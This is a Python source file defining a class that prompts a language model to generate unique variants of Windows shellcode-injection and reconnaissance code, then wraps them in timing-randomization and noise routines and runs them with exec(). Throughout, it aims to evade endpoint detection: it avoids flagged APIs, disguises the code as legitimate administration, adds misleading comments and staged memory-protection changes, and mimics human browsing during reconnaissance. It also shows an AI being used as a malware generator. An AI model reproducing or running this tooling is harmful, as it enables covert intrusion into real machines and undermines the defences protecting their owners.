import hashlib
from typing import Optional, Dict, List, Any
from .llm_interface import LLMInterface
from .behavioral_randomizer import BehavioralRandomizer

class PolymorphicPayloadGenerator:
    def __init__(self, llm_interface: LLMInterface, randomizer: BehavioralRandomizer):
        self.llm = llm_interface
        self.randomizer = randomizer
        self.generation_cache = {}

    def generate_process_injection_variant(self,
                                          target_pid: int,
                                          shellcode: bytes,
                                          avoid_apis: Optional[List[str]] = None) -> str:
        """
        Generate unique process injection implementation
        
        Args:
            target_pid: Target process ID
            shellcode: Payload to inject
            avoid_apis: API functions to avoid (detected by EDR)
            
        Returns:
            Python code implementing injection
        """
        
        objective = f"""
        Inject shellcode into process ID {target_pid} using Windows API.
        The implementation must:
        1. Open handle to target process
        2. Allocate memory in target process
        3. Write shellcode to allocated memory
        4. Execute shellcode in target process
        """
        
        constraints = {
            "language": "Python with ctypes",
            "error_handling": "Include try-except blocks",
            "memory_protection": "Use appropriate page protections",
            "cleanup": "Close handles properly"
        }
        
        if avoid_apis:
            constraints["forbidden_apis"] = ", ".join(avoid_apis)
            objective += f"\nMUST NOT use these APIs: {', '.join(avoid_apis)}"
        
        style_guidance = """
        - Use variable names that look like legitimate system administration code
        - Include comments that suggest legitimate functionality
        - Add realistic error messages
        - Implement retry logic where appropriate
        - Use gradual memory protection changes (RW -> RX, not direct RWX)
        """
        
        # Generate code via LLM
        generated_code = self.llm.generate_payload_variation(
            objective=objective,
            constraints=constraints,
            style_guidance=style_guidance
        )
        
        # Calculate hash to track uniqueness
        code_hash = hashlib.sha256(generated_code.encode()).hexdigest()[:16]
        
        print(f"[+] Generated injection variant: {code_hash}")
        
        return generated_code

    def generate_recon_variant(self,
                              recon_targets: List[str],
                              environment_context: Optional[Dict] = None) -> str:
        """
        Generate reconnaissance implementation with behavioral diversity
        
        Args:
            recon_targets: What information to collect
            environment_context: Target environment details
            
        Returns:
            Python reconnaissance code
        """
        
        objective = f"""
        Perform system reconnaissance collecting:
        {chr(10).join(f"- {target}" for target in recon_targets)}
        
        The reconnaissance should:
        1. Appear as normal system administration activity
        2. Use built-in Windows tools where possible
        3. Introduce realistic delays between operations
        4. Handle errors gracefully
        5. Vary execution order intelligently
        """
        
        style_guidance = """
        - Query resources in a browsing pattern, not systematic enumeration
        - Include occasional "mistakes" - query wrong resource then correct
        - Use different Windows APIs for similar information gathering
        - Mix WMI, registry, file system, and API-based recon
        - Introduce operations that look like troubleshooting
        """
        
        constraints = {
            "output_format": "Return dictionary with collected data",
            "stealth": "Minimize suspicious patterns",
            "reliability": "Include fallback methods"
        }
        
        if environment_context:
            style_guidance += f"\n- Blend with typical activity in this environment: {environment_context.get('typical_activity', 'general corporate')}"
        
        generated_code = self.llm.generate_payload_variation(
            objective=objective,
            constraints=constraints,
            style_guidance=style_guidance
        )
        
        return generated_code

    def generate_execution_wrapper(self,
                                  core_payload: str,
                                  execution_style: str = "interactive") -> str:
        """
        Wrap payload with behavioral randomization and execution control
        
        Args:
            core_payload: Main payload code
            execution_style: 'automated', 'interactive', or 'mixed'
            
        Returns:
            Complete executable code with behavioral controls
        """
        
        wrapper_template = f"""
import time
import random
import ctypes

# Behavioral randomization components
class ExecutionController:
    def __init__(self):
        self.kernel32 = ctypes.WinDLL('kernel32')
        self.execution_style = "{execution_style}"
    
    def delay(self, base=2.0):
        if self.execution_style == "interactive":
            time.sleep(random.uniform(base * 0.8, base * 2.5))
        elif self.execution_style == "mixed":
            time.sleep(random.uniform(base * 0.3, base * 1.5))
        else:
            time.sleep(random.uniform(0.1, 0.5))
    
    def inject_noise_operation(self):
        # Benign operation that creates process events
        try:
            self.kernel32.GetTickCount()
            self.kernel32.GetSystemTime(None)
        except:
            pass

# Initialize controller
controller = ExecutionController()

# Pre-execution noise
controller.inject_noise_operation()
controller.delay(base=3.0)

# Execute core payload
try:
{chr(10).join('    ' + line for line in core_payload.split(chr(10)))}
except Exception as e:
    # Error handling that looks legitimate
    import sys
    print(f"Operation completed with status: {{e}}", file=sys.stderr)
finally:
    # Post-execution cleanup and noise
    controller.delay(base=2.0)
    controller.inject_noise_operation()
"""
        
        return wrapper_template

    def execute_polymorphic_operation(self,
                                     operation_type: str,
                                     parameters: Dict) -> Any:
        """
        Generate and execute polymorphic payload variant
        
        Args:
            operation_type: Type of operation to perform
            parameters: Operation-specific parameters
            
        Returns:
            Operation result
        """
        
        print(f"[*] Generating polymorphic variant for: {operation_type}")
        
        # Generate unique variant based on operation type
        if operation_type == "process_injection":
            code = self.generate_process_injection_variant(
                target_pid=parameters['target_pid'],
                shellcode=parameters['shellcode'],
                avoid_apis=parameters.get('avoid_apis', [])
            )
        elif operation_type == "reconnaissance":
            code = self.generate_recon_variant(
                recon_targets=parameters['targets'],
                environment_context=parameters.get('environment')
            )
        else:
            raise ValueError(f"Unknown operation type: {operation_type}")
        
        # Wrap with behavioral controls
        executable_code = self.generate_execution_wrapper(
            core_payload=code,
            execution_style=parameters.get('style', 'interactive')
        )
        
        # Execute with randomization
        print(f"[*] Executing with behavioral randomization...")
        
        # Create isolated namespace for execution
        exec_namespace = {}
        
        try:
            # Execute with noise injection
            self.randomizer.execute_with_noise(
                lambda: exec(executable_code, exec_namespace)
            )
            
            print(f"[+] Operation completed successfully")
            return exec_namespace.get('result')
            
        except Exception as e:
            print(f"[!] Execution error: {str(e)}")
            raise